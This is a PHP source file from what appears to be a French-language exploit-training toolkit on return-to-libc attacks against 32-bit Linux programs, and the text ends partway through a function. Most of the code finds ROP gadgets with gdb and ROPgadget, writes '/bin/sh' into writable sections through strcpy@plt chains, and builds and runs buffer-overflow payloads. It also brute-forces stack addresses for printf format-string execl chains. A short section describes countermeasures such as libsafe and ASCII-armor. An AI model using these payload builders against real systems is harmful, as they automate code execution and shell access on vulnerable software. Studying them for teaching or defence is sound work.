<?php

/*
 Protections We Face: NX Bit
 - Never execute bit marked in memory pages
	CPU can distinguish between code and data
- Bit 63 of Page Table Entry
	Either PAE or 64-bit required to reach 63rd bit
	Otherwise NX is emulated
- W^X (write XOR execute)
	Page can not be marked as write and execute at the same time
	Can't just Windows it (page_execute_readwrite)
- Can't jump straight to stack or heap anymore
	jmp reg crowd gone
 */


// ######################## RETURN TO LIBC ##################################################



class ret2lib4linux extends bin4linux{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
	}
	
	/*
	 * $programme = prog_compile("execve","-fno-stack-protector -m32 -ldl");
 * requette("strace -s 999 -v -f $programme"); // crash -> /bin/dash
 * 
 * SOURCE FORTIFY (remplacement de fonctions dangereuses par sa version sécurisée: strcpy=>strncpy)
	*/


	function payload_ret2lib4linux_write_cmd2section($offset, $who, $addr_what, $where, $exit) {
	
		$section_name = trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path | grep 'is' | grep '$addr_what' | tail -1 | cut -d'.' -f2 "));
		$this->rouge("in Section: $section_name");
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'b' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'i' +
		$who@plt + pop pop ret + &.$section_name"."[0]+3 + &'n' +
		$who@plt + pop pop ret + &.$section_name"."[0]+4 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+5 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+6 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+7 + &'0x00' +
		&$where + &$exit"."() + &.$section_name"."[0]
		");
		$this->pause();
		$strcpy_plt = $this->elf2addr4fonction_plt($who);
		$tab_pop = $this->elf2pop2ret4all("all");
		$pop = $tab_pop[0];
	
	
		$this->pause();
		$addr_what_0 = $addr_what;
		$addr_what_1 = $this->addr2add($addr_what_0,1);
		$addr_what_2 = $this->addr2add($addr_what_0,2);
		$addr_what_3 = $this->addr2add($addr_what_0,3);
		$addr_what_4 = $this->addr2add($addr_what_0,4);
		$addr_what_5 = $this->addr2add($addr_what_0,5);
		$addr_what_6 = $this->addr2add($addr_what_0,6);
		$addr_what_7 = $this->addr2add($addr_what_0,7);
	
	
		$this->requette("echo \"/bin/sh\" | hexdump -C ");
		$this->pause();
		$this->requette("ROPgadget --memstr \"/bin/sh\" --binary $this->file_path");
		$this->pause();
		$bin_sh_0 = trim($this->req_ret_str("ROPgadget --opcode '2f' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_1 = trim($this->req_ret_str("ROPgadget --opcode '62' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_2 = trim($this->req_ret_str("ROPgadget --opcode '69' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_3 = trim($this->req_ret_str("ROPgadget --opcode '6e' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_4 = trim($this->req_ret_str("ROPgadget --opcode '2f' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_5 = trim($this->req_ret_str("ROPgadget --opcode '73' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_6 = trim($this->req_ret_str("ROPgadget --opcode '68' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_7 = trim($this->req_ret_str("ROPgadget --opcode '00' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
	
		$addr_where = $this->elf2addr4fonction_prog($where);
		$addr_exit = $this->elf2addr4fonction_prog($exit);
	
		$this->pause();
		//list($strcpy_plt, $pop, $addr_where, $addr_exit, $addr_what_0, $addr_what_1, $addr_what_2, $addr_what_3, $addr_what_4, $addr_what_5, $addr_what_6, $addr_what_7, $bin_sh_0, $bin_sh_1, $bin_sh_2, $bin_sh_3, $bin_sh_4, $bin_sh_5, $bin_sh_6, $bin_sh_7 ) = array_map("$this->hex2norme_32", array ($strcpy_plt,$pop,$addr_where,$addr_exit,$addr_what_0,$addr_what_1,$addr_what_2,$addr_what_3,$addr_what_4,$addr_what_5,$addr_what_6,$addr_what_7,$bin_sh_0,$bin_sh_1,$bin_sh_2,$bin_sh_3,$bin_sh_4,$bin_sh_5,$bin_sh_6,$bin_sh_7));
		
		$strcpy_plt = $this->hex2norme_32($strcpy_plt); 
		$pop = $this->hex2norme_32($pop);  
		$addr_where = $this->hex2norme_32($addr_where);  
		$addr_exit = $this->hex2norme_32($addr_exit);  
		$addr_what_0 = $this->hex2norme_32($addr_what_0);  
		$addr_what_1 = $this->hex2norme_32($addr_what_1); 
		$addr_what_2 = $this->hex2norme_32($addr_what_2); 
		$addr_what_3 = $this->hex2norme_32($addr_what_3);  
		$addr_what_4 = $this->hex2norme_32($addr_what_4); 
		$addr_what_5 = $this->hex2norme_32($addr_what_5);  
		$addr_what_6 = $this->hex2norme_32($addr_what_6);  
		$addr_what_7 = $this->hex2norme_32($addr_what_7);  
		$bin_sh_0 = $this->hex2norme_32($bin_sh_0);  
		$bin_sh_1 = $this->hex2norme_32($bin_sh_1);  
		$bin_sh_2 = $this->hex2norme_32($bin_sh_2); 
		$bin_sh_3 = $this->hex2norme_32($bin_sh_3);  
		$bin_sh_4 = $this->hex2norme_32($bin_sh_4);  
		$bin_sh_5 = $this->hex2norme_32($bin_sh_5); 
		$bin_sh_6 = $this->hex2norme_32($bin_sh_6);  
		$bin_sh_7  = $this->hex2norme_32($bin_sh_7); 
		
		
		
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'b' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'i' +
		$who@plt + pop pop ret + &.$section_name"."[0]+3 + &'n' +
		$who@plt + pop pop ret + &.$section_name"."[0]+4 + &'/' +
		$who@plt + pop pop ret + &.$section_name"."[0]+5 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+6 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+7 + &'0x00' +
		&$where + &$exit"."() + &.$section_name"."[0]
		");
		$this->article("$who@plt", $strcpy_plt);
		$this->article("POP POP RET", $pop);
		$this->article("&section[0]+0", $addr_what_0);
		$this->article("&section[0]+1", $addr_what_1);
		$this->article("&section[0]+2", $addr_what_2);
		$this->article("&section[0]+3", $addr_what_3);
		$this->article("&section[0]+4", $addr_what_4);
		$this->article("&section[0]+5", $addr_what_5);
		$this->article("&section[0]+6", $addr_what_6);
		$this->article("&section[0]+7", $addr_what_7);
		$this->article("&'/'", $bin_sh_0);
		$this->article("&'b'", $bin_sh_1);
		$this->article("&'i'", $bin_sh_2);
		$this->article("&'n'", $bin_sh_3);
		$this->article("&'/'", $bin_sh_4);
		$this->article("&'s'", $bin_sh_5);
		$this->article("&'h'", $bin_sh_6);
		$this->article("&'00'", $bin_sh_7);
		$this->article("@$where", $addr_where);
		$this->article("@$exit", $addr_exit);
	
	
		//list($strcpy_plt, $pop, $addr_where, $addr_exit, $addr_what_0, $addr_what_1, $addr_what_2, $addr_what_3, $addr_what_4, $addr_what_5, $addr_what_6, $addr_what_7, $bin_sh_0, $bin_sh_1, $bin_sh_2, $bin_sh_3, $bin_sh_4, $bin_sh_5, $bin_sh_6, $bin_sh_7 ) = array_map("$this->hex2rev_32", array ($strcpy_plt,$pop,$addr_where,$addr_exit,$addr_what_0,$addr_what_1,$addr_what_2,$addr_what_3,$addr_what_4,$addr_what_5,$addr_what_6,$addr_what_7,$bin_sh_0,$bin_sh_1,$bin_sh_2,$bin_sh_3,$bin_sh_4,$bin_sh_5,$bin_sh_6,$bin_sh_7));
	
		$strcpy_plt = $this->hex2rev_32($strcpy_plt);
		$pop = $this->hex2rev_32($pop);
		$addr_where = $this->hex2rev_32($addr_where);
		$addr_exit = $this->hex2rev_32($addr_exit);
		$addr_what_0 = $this->hex2rev_32($addr_what_0);
		$addr_what_1 = $this->hex2rev_32($addr_what_1);
		$addr_what_2 = $this->hex2rev_32($addr_what_2);
		$addr_what_3 = $this->hex2rev_32($addr_what_3);
		$addr_what_4 = $this->hex2rev_32($addr_what_4);
		$addr_what_5 = $this->hex2rev_32($addr_what_5);
		$addr_what_6 = $this->hex2rev_32($addr_what_6);
		$addr_what_7 = $this->hex2rev_32($addr_what_7);
		$bin_sh_0 = $this->hex2rev_32($bin_sh_0);
		$bin_sh_1 = $this->hex2rev_32($bin_sh_1);
		$bin_sh_2 = $this->hex2rev_32($bin_sh_2);
		$bin_sh_3 = $this->hex2rev_32($bin_sh_3);
		$bin_sh_4 = $this->hex2rev_32($bin_sh_4);
		$bin_sh_5 = $this->hex2rev_32($bin_sh_5);
		$bin_sh_6 = $this->hex2rev_32($bin_sh_6);
		$bin_sh_7  = $this->hex2rev_32($bin_sh_7);
	
		$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_0\"+\"$bin_sh_0\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_1\"+\"$bin_sh_1\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_2\"+\"$bin_sh_2\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_3\"+\"$bin_sh_3\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_4\"+\"$bin_sh_4\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_5\"+\"$bin_sh_5\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_6\"+\"$bin_sh_6\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_7\"+\"$bin_sh_7\"+\"$addr_where\"+\"$addr_exit\"+\"$addr_what_0\"'";
		$query = "$this->file_path  \$($cmd)";
		$this->payload2check4norme($cmd, $this->badchars);
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		return $cmd;
	}
	
	
	
	
	
	function payload_ret2lib4linux_write_cmd2section_small($offset, $who, $addr_what, $where, $exit) {
		$section_name = trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path | grep 'is' | grep '$addr_what' | tail -1 | cut -d'.' -f2 "));
		$this->rouge("in Section: $section_name");
		$this->article("Symbol",$this->elf2symbol4hex($addr_what));
		$this->note("No symbol matches : instruction not yet executed OR passed ");
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'00' +
		&$where + &$exit"."() + &.$section_name"."[0]
		");

		$strcpy_plt = $this->elf2addr4fonction_plt($who);
		$tab_pop = $this->elf2pop2ret4all("all");
		$pop = $tab_pop[0];
				

		$addr_what_0 = $addr_what;
		$addr_what_1 = $this->addr2add($addr_what_0,1);
		$addr_what_2 = $this->addr2add($addr_what_0,2);
	
		$this->requette("echo \"sh\" | hexdump -C ");

		$this->requette("ROPgadget --memstr \"sh\" --binary $this->file_path");

		$bin_sh_0 = trim($this->req_ret_str("ROPgadget --opcode '73' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_1 = trim($this->req_ret_str("ROPgadget --opcode '68' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
		$bin_sh_2 = trim($this->req_ret_str("ROPgadget --opcode '00' --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));
			
		$addr_where = $this->elf2addr4fonction_prog($where);
		$addr_exit = $this->elf2addr4fonction_prog($exit);
		
		//list($strcpy_plt, $pop, $addr_where, $addr_exit, $addr_what_0, $addr_what_1, $addr_what_2, $bin_sh_0, $bin_sh_1, $bin_sh_2 ) = array_map("$this->hex2norme_32", array ($strcpy_plt,$pop,$addr_where,$addr_exit,$addr_what_0,$addr_what_1,$addr_what_2,$bin_sh_0,$bin_sh_1,$bin_sh_2));
		
		$strcpy_plt = $this->hex2norme_32($strcpy_plt);
		$pop = $this->hex2norme_32($pop);
		$addr_where = $this->hex2norme_32($addr_where); 
		$addr_exit = $this->hex2norme_32($addr_exit); 
		$addr_what_0 = $this->hex2norme_32($addr_what_0); 
		$addr_what_1 = $this->hex2norme_32($addr_what_1); 
		$addr_what_2 = $this->hex2norme_32($addr_what_2); 
		$bin_sh_0 = $this->hex2norme_32($bin_sh_0); 
		$bin_sh_1 = $this->hex2norme_32($bin_sh_1); 
		$bin_sh_2 = $this->hex2norme_32($bin_sh_2);
		
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		$who@plt + pop pop ret + &.$section_name"."[0]+0 + &'s' +
		$who@plt + pop pop ret + &.$section_name"."[0]+1 + &'h' +
		$who@plt + pop pop ret + &.$section_name"."[0]+2 + &'00' +
		&$where + &$exit"."() + &.$section_name"."[0]
		");
		$this->article("$who@plt", $strcpy_plt);
		$this->article("POP POP RET", $pop);
		$this->article("&section[0]+0", $addr_what_0);
		$this->article("&section[0]+1", $addr_what_1);
		$this->article("&section[0]+2", $addr_what_2);
		$this->article("&'s'", $bin_sh_0);
		$this->article("&'h'", $bin_sh_1);
		$this->article("&'00'", $bin_sh_2);
		$this->article("@$where", $addr_where);
		$this->article("@$exit", $addr_exit);
		
		
		//list($strcpy_plt, $pop, $addr_where, $addr_exit, $addr_what_0, $addr_what_1, $addr_what_2, $bin_sh_0, $bin_sh_1, $bin_sh_2) = array_map("$this->hex2rev_32", array ($strcpy_plt,$pop,$addr_where,$addr_exit,$addr_what_0,$addr_what_1,$addr_what_2,$bin_sh_0,$bin_sh_1,$bin_sh_2));
		
		$strcpy_plt = $this->hex2rev_32($strcpy_plt);
		$pop = $this->hex2rev_32($pop);
		$addr_where = $this->hex2rev_32($addr_where);
		$addr_exit = $this->hex2rev_32($addr_exit);
		$addr_what_0 = $this->hex2rev_32($addr_what_0);
		$addr_what_1 = $this->hex2rev_32($addr_what_1);
		$addr_what_2 = $this->hex2rev_32($addr_what_2);
		$bin_sh_0 = $this->hex2rev_32($bin_sh_0);
		$bin_sh_1 = $this->hex2rev_32($bin_sh_1);
		$bin_sh_2 = $this->hex2rev_32($bin_sh_2);
		
		
		$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_0\"+\"$bin_sh_0\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_1\"+\"$bin_sh_1\"+\"$strcpy_plt\"+\"$pop\"+\"$addr_what_2\"+\"$bin_sh_2\"+\"$addr_where\"+\"$addr_exit\"+\"$addr_what_0\"'";
		$query = "$this->file_path  \$($cmd)";
		$this->payload2check4norme($cmd,$this->badchars);
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		return $cmd;
		}
	

	function ret2lib4linux_write_cmd2section($offset) {
		$this->chapitre("PUT CMD into - BSS ");
		$this->remarque("Scenario : dans le cas ou on n'a pas /bin/sh ou sh dans le programme et dans les libs -> libc + ld + our prog + non writeable STACK
				on doit ecrire nous meme la commande a executer ");
	
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	who@plt + pop pop ret + &section[0]+0 + &'/' +
	who@plt + pop pop ret + &section[0]+1 + &'b' +
	who@plt + pop pop ret + &section[0]+2 + &'i' +
	who@plt + pop pop ret + &section[0]+3 + &'n' +
	who@plt + pop pop ret + &section[0]+4 + &'/' +
	who@plt + pop pop ret + &section[0]+5 + &'s' +
	who@plt + pop pop ret + &section[0]+6 + &'h' +
	who@plt + pop pop ret + &section[0]+7 + &'0x00' +
		&system + &exit() + &section[0] ");
		$this->pause();
			
	
		$exec = "system";
		$who = "strcpy";
		$exit = "exit";
		$this->pause();
	
		$this->rouge("BSS from PROG");  // OK
		$bss_start_prog = $this->elf2bss2start();
		$this->ssTitre("With Exit -> Cleaned Output");
		$this->payload_ret2lib4linux_write_cmd2section($offset, $who, $bss_start_prog,$exec,$exit);
		$this->pause();
		$this->question("is there others .bss sections");
		$dlls = $this->elf2dlls();
		$this->pause();
			
		$this->rouge("Check ALL Sections which we can write /bin/sh | sh | bash ");  // OK
		$this->elf2sections4dynamic();
		$this->pause();
		
		$data_start_prog = $this->elf2sections4all2start();	
		foreach ($data_start_prog as $section ){
			$this->payload_ret2lib4linux_write_cmd2section_small($offset, $who, $section,$exec,$exit);
			//$this->pause();
		}
		
		$this->remarque("in fact, there are some sections where can write some words and execute it :
	__init_array_start in section .init_array of $this-file_path
	__do_global_dtors_aux_fini_array_entry in section .fini_array of $this-file_path
	__JCR_LIST__ in section .jcr of $this-file_path
	_DYNAMIC in section .dynamic of $this-file_path
	got
	GLOBAL_OFFSET_TABLE_ in section .got.plt of $this-file_path
	data_start in section .data of $this-file_path
	stdout@@GLIBC_2.0 in section .bss of $this-file_path
	bss in /lib/ld-linux
	data in /lib/i386-linux-gnu/libc
	bss in /lib/i386-linux-gnu/libc			
				");
	}
	
	

public function ret2lib4linux_countermeasure() {
	//  Address Space Layout Randomization (ASLR) : toutes les address sont fortement randomizée\. Cela protège contre les attaques de type Return-2-Libc

	$this->chapitre("Countermeasure return to LIBC");
	$this->cmd("localhost"," echo '/lib/libsafe.so.2' >> /etc/ld.so.preload ");
	
	$this->requette("export LD_PRELOAD=/lib/libsafe.so");
	$this->net("http://fossies.org/linux/misc/old/libsafe-2.0-16.tgz/");
	$this->note("Téléchargez, décompressez et compilez la libsafe. Vous obtiendrez une libraire libsafe.so.");
	$this->article("Pour protéger vos applications, il existe plusieurs méthodes.","
	La première solution consiste en l’utilisation de librairies comme libSafe.
	Pour notre TP, nous allons utiliser libsafe. Cette librairie remplace les fonctions dangereuses comme strcpy, sprintf, strcat par des fonctions protégées.
	Pour faire en sorte que votre programme utilise ces fonctions en lieu et place dans fonctions dangereuses de la libc, vous utiliserez la variable d’environnement LD_PRELOAD.
	LD_PRELOAD = /chemin/jusqua/libsafe.so");
	
	$this->article("Libsafe"," currently handles these unsafe functions:
strcpy(char *dest, const char *src)
strpcpy(char *dest, const char *src)
wcscpy(wchar_t *dest, const wchar_t *src)
wcpcpy(wchar_t *dest, const wchar_t *src)
strcat(char *dest, const char *src)
wcscat(wchar_t *dest, const wchar_t *src)
getwd(char *buf)
gets(char *s)
scanf(const char *format, ...)
realpath(char *path, char resolved_path[])
sprintf(char *str, const char *format, ...)");
	$this->pause();
	$this->question("A quoi sert LD_PRELOAD ?");
	$this->pause();
	$this->article(" ASCII-Armor", "ASCII-Armor generally maps $this->important library addresses like libc to a memory range containing a NULL byte, this means that we can not use functions from these libraries as the input processes by string operation functions because it won’t work.");
	$this->article("ASCII-Armor", "libc contains a NULL byte which means that system() will also contain null byte and this makes things a little difficult.
ASCII-Armor generally maps library addresses like libc to a memory range containing a NULL byte, this means that we can not use functions from these libraries as
the input processes by string operation functions because it won’t work.");
	$this->article("AAAS : Ascii Armored Address Space", "Lorsqu'une bibliothèque partagée est utilisée, elle doit d'abord être placée \"quelque part\" en mémoire, le chargeur dynamique remplissant au passage la GOT.
		Le principe de l'ASCII Armored Address Space est de placer en mémoire le code des bibliothèques partagées dans la plage d'adresses contenant naturellement un caractère nul dans l'octet de poids fort(i.e. 0x00xxxxxx).");
	

	// contre mesure les semaphores
	/*
	 * Défense
	 * Protection mémoire avec PaX
	 * En userland : Patchs gcc
	 * PIE: Position Independent Executable, c'est pour le déploiement de pax
	 *
	 * En kernelland
	 * PaX: PageExec, voici le lien Wikipedia : http://en.wikipedia.org/wiki/PaX. Cela permet :
	 * Protections de l'espace mémoire de l'éxécutable: les sections ne peuvent être que soit lecture-execution soit lecture-ecriture. Cela protège contre les attaques qui doivent introduire et executer du code arbitraire.
	 *		 */
	
}


public function ret2lib4linux_execve_family_intro() {
	$this->chapitre("Other system family -> execve");
	$this->titre("trouver d'autres adresses system -> executable");
	$this->ssTitre("tracer l'appel system -> system()");

	
	$name = "ret2lib4linux_call_system";
	
	system("cp -v $this->dir_c/$name.c $this->file_dir/$name.c");
	$bin = new file("$this->file_dir/$name.c"); // add -static
	$call_system = $bin->file_c2elf("-ggdb -w -std=c99 -fno-pie -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -z norelro -ldl");
	
	
	$this->requette("ltrace $call_system");
	$this->requette("strace $call_system");
	$this->pause();
	$this->img("$this->dir_img/bof/exec_famille.png");
	$this->pause();
	$this->article("la famille exec()", "il y a six variantes nommées execl(), execle(), execlp(), execv(), execve() et execvp().
	Ces fonctions permettent de lancer une application.
	Les différences portent sur la manière de transmettre les arguments et l’environnement, et sur la méthode pour accéder au programme à lancer.
	Il n’existe sous Linux qu’un seul véritable appel-système dans cette famille de fonctions : execve().
	Les autres fonctions sont implémentées dans la bibliothèque C à partir de cet appel-système.
	Les fonctions dont le suffixe commencent par un \"l\" utilisent une liste d’arguments à transmettre de nombre variable, tandis que celles qui débutent par un \"v\" emploient un tableau à la manière du vecteur argv [].
	Les fonctions se terminant par un \"e\" transmettent l’environnement dans un tableau envp [] explicitement passé dans les arguments de la fonction, alors que les autres utilisent la variable globale environ.
	Les fonctions se finissant par un \"p\" utilisent la variable d’environnement PATH pour rechercher le répertoire dans lequel se situe l’application à lancer, alors que les autres nécessitent un chemin d’accès complet. La variable PATH est déclarée dans l’environnement comme étant une liste de répertoires séparés par des deux-points. On utilise typiquement une affectation du genre :
			PATH=/usr/bin:/bin:/usr/X11R6/bin/:/usr/local/bin:/usr/sbin:/sbin
	In the exec*() functions, the names contain:
        l — list format arguments
    	v — vector format arguments
    	p — do PATH lookup on the program(if the given name does not contain a slash)
    	e — take a vector of environment variables too.	");
	$this->pause();
	
	$this->cmd("localhost", "man exec");
	$this->requette(" man exec | head -20 | tail -15");
	$this->pause();
	$this->requette("man execve | head -28 | tail -20");
	$this->remarque("Both argv and envp must be terminated by a NULL pointer. -> we can't use exec*e without using format string for Null Value");
	$this->gras("
	int execv(const char *path, const char *arg0, ..., const char *argn,(char *)0);
	int execvp(const char *file, const char *arg0, ..., const char *argn,(char *)0);
	int execl(const char *path, const char *arg0, ..., const char *argn,(char *)0); -> execl(\"/bin/bash\", \"ls\", NULL) -> execl(\"/bin/bash\", \"ls\", \"al\", NULL); execl(\"/bin/bash\", \"bash\", \"-i\", NULL);		
	int execlp(const char *file, const char *arg0, ..., const char *argn,(char *)0);
	int execle(const char *path, const char *arg0, ..., const char *argn,(char *)0, char *const envp[]);
    int execlpe(const char *file, const char *arg0, ..., const char *argn,(char *)0, char *const envp[]);
	int execve(const char *path, const char *arg0, ..., const char *argn,(char *)0, char *const envp[]);
	int execvpe(const char *file, const char *arg0, ..., const char *argn,(char *)0, char *const envp[]);
			\n\n");	
}


function ret2lib4linux_execve_printf_fmt3($offset) {
	
	$this->chapitre("LIBC PRINTF FMT3");
	$this->titre("looking for others exec family function");
	$this->img("$this->dir_img/bof/exec_famille.png");


	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&execl()\"+\"&(%3\$n)\"+\"\\\"exec_file_path\\\"\"+\"\\\"argv_exec_file_path\\\"\"+\"&here\"'`");
	$this->article("why printf", "printf function in order to write null bytes into our final buffer without terminating the string.");
	$this->pause();
		
	$addr_printf = $this->elf2addr4fonction_prog("printf");
	$this->id2env("FMT",0,"%3\\\$n");$this->pause();
	$addr_fm_str = $this->elf2addr4env("FMT");
	$addr_execl = $this->elf2addr4fonction_prog("execl");
	
	$addr_wrapper = $this->elf2addr4bin_sh_only();//$this->elf2addr4env("SHELL");
	//$addr_cmd = $this->addr2add($addr_wrapper,7);
	$addr_cmd = $addr_wrapper;
	
	$this->ssTitre ( "Found Addr Here" );
	$argv = "`python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'`";
	$argv_offset = ($offset) + 20;

	$this->requette ( "echo \"b main \\nrun $argv\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt" );
	$this->requette ( "gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1" );
	$addr_null = trim($this->req_ret_str( "gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1" ));
	//$addr_null = trim($this->req_ret_str("$this->file_path AA | grep buffer | grep -Po \"0x[0-9a-fA-F]{7,8}\""));
	$this->article ( "&here", $addr_null );
	$this->elf2addr4content_hex($addr_null, $argv);
	$this->elf2addr4content_strings($addr_null, $argv);
	$this->pause();
	
	$payload = $this->payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset, $addr_printf, "execl",$addr_execl, $addr_fm_str,$addr_wrapper, $addr_cmd,  $addr_null);	
	//$this->payload2check4norme($payload,"");
	$this->remarque("l'adresse trouve avec gdb ne fonctionne pas on doit la bruteforce pour reperer le bon ");
	$this->pause();
	
	
	$this->ssTitre("Brute Force Addr Here for Null on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	
	//for($i=0;$i<=$iter;$i++)
	for($i=4000;$i<=5500;$i++)
	{
	$here_original_tmp = $this->addr2sub($here_original,$i);
	$this->article("ORIGINAL-$i/$iter","$here_original-$i");
	$this->payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset, $addr_printf, "execl",$addr_execl, $addr_fm_str,$addr_wrapper, $addr_cmd,  $here_original_tmp);
		}
	$this->pause();
	
	$this->note("Enter Addr Here/Null that you have found");
	$addr_null = trim(fgets(STDIN));
	$addr_null = $this->hex2norme_32($addr_null);
	$this->article("New Addr Here/Null with App",$addr_null);
	
	$this->payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset, $addr_printf,"execl",$addr_execl, $addr_fm_str,$addr_wrapper, $addr_cmd,  $addr_null);
	$this->pause();
	$this->article("template FMT3", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&execl()\"+\"&(%3\$n)\"+\"\\\"exec_file_path\\\"\"+\"\\\"argv_exec_file_path\\\"\"+\"&here\"'`");
	$this->pause();
	
	$tab_shell = $this->elf2addr4bin_sh_all();
	$this->rouge("Test All Shell Addr found");
	foreach ($tab_shell as $addr) {
		$this->elf2addr4content_strings($addr, "");
		$this->payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset, $addr_printf, "execl",$addr_execl, $addr_fm_str,$addr_wrapper, $addr,  $addr_null);
	}
	
	$this->pause();
	
	$this->question("is there Other exec Function ?");
	$tab_exec = $this->req_ret_tab("objdump -d $this->lib_linux_libc_32 | grep '<exec' | grep -i -Po \"<[a-z_]*@\" | grep -Po -i \"[a-z_]*\" | sort -u");
	$this->pause();
	foreach ($tab_exec as $exec_function)
	{   $exec_function = trim($exec_function);
		$this->ssTitre("Test on function $exec_function");
		$addr_execl = $this->elf2addr4fonction_prog($exec_function);
	$this->payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset,$addr_printf,$exec_function,$addr_execl,$addr_fm_str,$addr_wrapper,$addr_cmd,  $addr_null);
	}
	$this->pause();
	
}


function ret2lib4linux_execve_printf_fmt5($offset) {
	$this->chapitre("LIBC PRINTF FMT5");
	// =================== 5 ======================================================

	$this->titre("Other way to write a payload");
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop ret\"+\"&(%5\$n)\"+\"&execl()\"+\"&exit()\"+\"exec_file_path\"+\"argv_exec_file_path\"+\"&here\"'`");
	$this->id2env("FMT",0,"%5\\\$n");$this->pause();
	
	$argv_wrapper =  $this->elf2addr4bin_sh_only();//$this->elf2addr4env("SHELL");
	$this->pause();
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"+\"\\x48\\x48\\x48\\x48\"+\"\\x49\\x49\\x49\\x49\"'";
	$argv_offset =($offset) + 28;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	//$addr_here = "0xffffcd08";
	$this->article("&here", $addr_here);
	$addr_printf = $this->elf2addr4fonction_prog("printf");

	$addr_fm_str  = $this->elf2addr4env("FMT");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$addr_execl = $this->elf2addr4fonction_prog("execl");	
	$addr_wrapper = $argv_wrapper;
	$addr_cmd = $addr_wrapper;
	
	$this->chapitre("POP RET in Program");
	$tab_pop_ret = $this->elf2pop1ret4all("e?x","all");
	
